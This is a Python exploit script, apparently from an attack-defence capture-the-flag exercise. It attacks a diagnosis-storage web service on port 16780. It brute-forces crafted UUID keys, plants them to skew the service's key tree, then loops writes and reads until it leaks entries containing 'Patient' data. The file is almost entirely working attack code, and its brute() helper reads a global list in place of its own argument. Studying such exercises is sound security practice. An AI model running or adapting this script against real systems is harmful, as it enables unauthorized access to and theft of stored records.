#!/usr/bin/env python3

import requests
import traceback
import random
import string
import time
import sys
import struct
import subprocess

from bs4 import BeautifulSoup

hostname = sys.argv[1]

def brute(uuid):
    output = subprocess.check_output(
        ["bin/brute", uuid, "3"],
        input='\n'.join(uuids).encode('ascii', errors='replace'),
    )

    return output.decode('ascii', errors='replace').strip()

def compute_path(n):
    path = []
    while (n > 2047):
        if n % 2 == 0:
            n = (n - 2) // 2
            path.append(('right', n))

        else:
            n = (n - 1) // 2
            path.append(('left', n))
    return path

def compute_uuids(path):
    start = '312f0000-0000-0000-0000-000000000000'
    lower = 0x2200
    upper = 0x4200
    mid = (lower + upper) // 2
    uuid = start[:2] + hex(mid)[2:] + start[6:]
    uuids = [uuid]
    for where, n in path[::-1][1:]:
        mid = (lower + upper) // 2
        if where == 'left':
            upper = mid
            mid = (lower + upper) // 2
        else:
            lower = mid
            mid = (lower + upper) // 2
        uuid = start[:2] + hex(mid)[2:] + start[6:]
        uuids.append(uuid)
    return uuids

def brute_uuids(uuids):
    inputs =[]
    for uuid in uuids:
        out = brute(uuid)
        #print(out)
        inputs.append(out.split('|')[0])
    return inputs

def put(key, value):
    url = "http://" + hostname + ":16780/" + key;
    response = requests.post(url, data = b"diag=" + value, allow_redirects = False)
    key = response.headers['Location'][1:]
    #print("Saved value " + str(value) + " @ " + key)

def get(key):
    url = "http://" + hostname + ":16780/" + key
    response = requests.get(url)
    soup = BeautifulSoup(response.text, features="html.parser")
    diag = soup.find(id="diag")
    return diag.text

cmd = sys.argv[2]

if cmd == 'put':
    put("", sys.argv[3].encode('ascii'))
if cmd == 'putk':
    put(sys.argv[3], b"x")

if cmd == 'generate':
    path = compute_path(10_000_012)
    uuids = compute_uuids(path)
    inputs = brute_uuids(uuids)
    for s in inputs:
        print(s)

# generated
inputs = [
    '>k:c',
    'ZDrC',
    '$ibL',
    '"`]t',
    'lBq1',
    'f{"l',
    '_(2f',
    '=p53',
    'l&gr',
    '*hd0',
    'p)"j',
    'j>Fe',
    '[l=1'
]

if cmd == 'hack':

    for s in inputs[:-1]:
        print("Putting " + s)
        put(s, b"x")

    for i in range(2048, 11500):
        val = struct.pack("H", i)
        if b'\x00' in val:
            continue
        put("7fffffff-0000-0000-0000-000000000000", val);
        result = get(inputs[-1]);
        if "Patient" in result:
            print(result.split()[1])